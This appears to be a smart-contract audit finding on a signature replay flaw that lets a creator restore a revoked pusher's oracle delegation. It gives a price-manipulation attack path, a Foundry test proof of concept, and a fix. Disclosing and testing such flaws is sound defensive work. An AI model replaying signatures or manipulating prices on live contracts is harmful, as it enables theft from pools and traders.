### Title
`allowPushers` Signature Replay Nullifies `revokePusher` — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary

`allowPushers` has no used-signature bitmap or per-pusher nonce. A creator can replay a pusher's original consent signature at any time before its deadline, re-establishing `namespaceRemapping[pusher] = creator` immediately after the pusher called `revokePusher()`. The pusher's revocation is therefore not final while the original signature's deadline is still in the future.

### Finding Description

`allowPushers` verifies the pusher's EIP-191 consent signature and writes `namespaceRemapping[pusher] = msg.sender`: [1](#0-0) 

The only replay guard is `_ensureDeadline`, which checks `block.timestamp <= deadline` and nothing else: [2](#0-1) [3](#0-2) 

There is no `usedSignatures` mapping, no per-pusher nonce, and no revocation counter anywhere in the oracle contracts. A grep for `usedSignatures`, `nonce`, `signatureUsed` across all `.sol` files returns only unrelated periphery permit contracts.

`revokePusher` clears the mapping: [4](#0-3) 

But the original signature `(chainid, address(this), deadline, pusher, creator)` is still cryptographically valid. The creator can immediately call `allowPushers` again with the identical `deadline` and `signatures` arguments, and the `require(pusher == ECDSA.recover(...))` check passes again, re-writing `namespaceRemapping[pusher] = creator`.

The code comment at lines 186–191 explicitly acknowledges the deadline is intended to prevent re-establishment after revocation: [5](#0-4) 

But the implementation only enforces expiry, not one-time use. The stated invariant is broken.

### Impact Explanation

**Concrete fund-loss path:**

1. Pusher signs consent with `deadline = block.timestamp + 365 days`.
2. Creator calls `allowPushers` → `namespaceRemapping[pusher] = creator`.
3. Pusher's private key is compromised. Pusher calls `revokePusher()` to protect the creator's price feeds → `namespaceRemapping[pusher] = address(0)`.
4. Creator (or an automated keeper) replays the original signature by calling `allowPushers` again with the same `deadline` and `signatures` → `namespaceRemapping[pusher] = creator` is restored.
5. The attacker holding the compromised pusher key now pushes manipulated prices into the creator's namespace via the `fallback` path.
6. Pools consuming those feeds via `AnchoredPriceProvider` execute swaps at the manipulated bid/ask → traders receive wrong amounts, pool suffers conservation failure.

The `fallback` push path uses `namespaceRemapping` to resolve the effective namespace: [1](#0-0) 

### Likelihood Explanation

- Creators commonly use long-lived signatures (days to years) to avoid operational friction.
- Automated keeper bots that maintain delegations would replay the signature without human review.
- The pusher has no on-chain mechanism to permanently invalidate their own consent before the deadline expires.
- The attack requires only that the creator (or their automation) calls `allowPushers` once after the pusher's revocation — a single public transaction.

### Recommendation

Track used signatures with a `mapping(bytes32 => bool) private _usedConsentHashes` keyed on the full consent hash. Mark it `true` on first use in `allowPushers` and revert if already set. Alternatively, add a per-pusher monotonic nonce that the pusher increments on revocation, binding the signature to a specific delegation epoch.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayRevokedPusherTest is Test {
    CompressedOracleV1 oracle;
    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 60_000);
        pusher = vm.addr(PUSHER_KEY);
    }

    function testRevokedPusherResumesByReplay() public {
        uint256 deadline = block.timestamp + 365 days;

        // Pusher signs consent once
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // Step 1: creator delegates pusher
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // Step 2: pusher revokes (e.g., key compromise detected)
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // Step 3: creator replays the SAME signature — no nonce, no used-hash check
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);

        // REVOCATION_FINALITY_INVARIANT violated
        assertEq(oracle.namespaceRemapping(pusher), creator, "pusher re-delegated without fresh consent");
    }
}
```

    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
